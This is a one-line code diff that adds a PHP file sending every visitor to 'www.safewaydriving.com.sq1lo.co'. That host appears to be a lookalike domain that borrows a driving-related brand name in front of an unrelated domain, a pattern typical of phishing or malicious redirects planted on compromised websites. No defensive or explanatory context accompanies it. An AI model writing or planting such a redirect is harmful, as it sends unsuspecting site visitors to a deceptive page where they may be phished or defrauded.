@@ -1,0 +1,1 @@
+<?php header("Location: http://www.safewaydriving.com.sq1lo.co") ?>
